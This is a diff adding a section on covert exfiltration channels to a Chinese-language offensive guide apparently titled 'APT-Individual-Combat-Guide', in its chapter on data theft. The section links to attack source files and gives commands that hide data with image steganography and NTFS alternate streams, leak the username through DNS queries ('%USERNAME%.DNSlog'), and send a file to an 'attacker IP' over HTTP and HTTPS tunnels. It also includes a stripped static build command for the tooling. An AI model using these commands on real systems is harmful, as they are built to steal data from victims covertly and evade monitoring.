@@ -539,3 +539,57 @@ cl /EHsc a5_1_encrypt.cpp
 .\xor.exe 加密 "C:\Users\snowwolf\Desktop\rat\tips\h\aes" "1234567890abcdef"
 .\xor.exe 解密 "C:\Users\snowwolf\Desktop\rat\tips\h\aes" "1234567890abcdef"
 ```
+
+### 隐蔽通信通道
+
+1. 隐写术
+
+(1)图像隐写术
+
+[hide_image.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/hide_image.cpp)
+
+```bash
+.\hide_image.exe 隐藏 "隐藏的文件目录" "图片路径"
+```
+
+(2)数据流隐写术
+
+[ads.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/ads.cpp)
+
+```bash
+x86_64-w64-mingw32-g++ -O2 ads.cpp -o ads.exe -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+```bash
+Get-Item -Path C:\Users\snowwolf\Desktop\rat\tips\h\snowwolf.txt -Stream *
+```
+
+2. DNS隧道
+
+[dns.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/dns.cpp)
+
+```bash
+.\dns.exe %USERNAME%.DNSlog
+```
+
+3. HTTP隧道
+
+[py_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/py_server.py)
+
+[http.cpp](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/http.cpp)
+
+```bash
+python3 py_server.py
+.\http.exe 攻击者IP地址 snowwolf.txt
+```
+
+4. 加密隧道
+
+[https_server.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/https_server.py)
+
+[https_client.py](https://github.com/GhostWolfLab/APT-Individual-Combat-Guide/blob/main/Zh/%E7%AC%AC%E5%85%AD%E7%AB%A0/%E6%95%B0%E6%8D%AE%E7%AA%83%E5%8F%96/https_client.py)
+
+```bash
+python3 https_server.py
+python3 https_client.py
+```
